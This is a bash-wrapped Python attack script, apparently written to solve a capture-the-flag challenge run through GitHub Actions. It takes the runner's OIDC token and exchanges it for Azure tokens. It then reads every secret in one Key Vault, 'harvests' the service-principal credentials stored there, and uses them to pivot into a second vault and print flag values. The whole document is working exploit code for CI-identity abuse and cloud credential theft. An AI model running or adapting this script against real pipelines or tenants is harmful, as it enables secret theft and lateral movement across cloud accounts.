#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, urllib.request, urllib.parse, re

def http(url, data=None, headers=None, method=None):
    h = headers or {}
    body = None
    if isinstance(data, dict):
        body = urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read().decode()
    except urllib.error.HTTPError as e: return e.code, e.read().decode()
    except Exception as e: return 0, str(e)

TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
st,b = http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
            headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]

def tok_oidc(scope):
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token", {
        "client_id":CID,"scope":scope,"grant_type":"client_credentials",
        "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion":IDT})
    d=json.loads(b); return d.get("access_token"), (None if "access_token" in d else b[:200])

def tok_sp(tenant, cid, sec, scope):
    st,b=http(f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token", {
        "client_id":cid,"client_secret":sec,"scope":scope,"grant_type":"client_credentials"})
    d=json.loads(b); return d.get("access_token"), (None if "access_token" in d else b[:160])

ARM,_=tok_oidc("https://management.azure.com/.default")
KVT,_=tok_oidc("https://vault.azure.net/.default")
FLAG=re.compile(r"(DF26\{[^}]*\}|flag\{[^}]*\}|FLAG\{[^}]*\}|CTF\{[^}]*\})", re.I)

def kv_list(vault, token):
    return http(f"https://{vault}.vault.azure.net/secrets?api-version=7.4",
                headers={"Authorization":"Bearer "+token})
def kv_get(sid, token):
    return http(sid+"?api-version=7.4", headers={"Authorization":"Bearer "+token})

print("### [A] vault access with the OIDC identity")
for v in ("kv-tbl-prod-x3euoz","kv-tbl-sec-x3euoz"):
    st,b = kv_list(v, KVT)
    print(f"  {v}: HTTP {st} -> {b[:220]}")

print("\n### [B] harvest principals from kv-tbl-prod")
creds=[]
st,b = kv_list("kv-tbl-prod-x3euoz", KVT)
for s in json.loads(b).get("value",[]):
    name=s["id"].rsplit("/",1)[-1]
    st2,b2 = kv_get(s["id"], KVT)
    val=json.loads(b2).get("value","")
    m=FLAG.search(val)
    if m: print("  [FLAG]", name, m.group(1))
    try:
        j=json.loads(val); print(f"  {name}: json keys={sorted(j.keys())}")
        creds.append((name, j))
    except Exception:
        print(f"  {name}: non-json len={len(val)} prefix={val[:12]!r}")

print("\n### [C] pivot: each principal -> kv-tbl-sec-x3euoz")
for name, j in creds:
    cid = j.get("clientId") or j.get("appId") or j.get("client_id")
    sec = j.get("clientSecret") or j.get("password") or j.get("client_secret")
    ten = j.get("tenantId") or j.get("tenant") or j.get("tenant_id") or TEN
    if not (cid and sec):
        print(f"  {name}: no usable id/secret fields"); continue
    t,err = tok_sp(ten, cid, sec, "https://vault.azure.net/.default")
    if not t:
        print(f"  {name}: token FAILED {err}"); continue
    st,b = kv_list("kv-tbl-sec-x3euoz", t)
    print(f"  {name}: kv-tbl-sec list HTTP {st}")
    if st != 200:
        print("     ", b[:160]); continue
    for s in json.loads(b).get("value",[]):
        sn=s["id"].rsplit("/",1)[-1]
        st3,b3 = kv_get(s["id"], t)
        v=json.loads(b3).get("value","") if st3==200 else ""
        m=FLAG.search(v)
        print(f"     [FLAG] {sn} = {m.group(1)}" if m else f"     {sn} (len {len(v)})")
PYEOF
echo "=== done ==="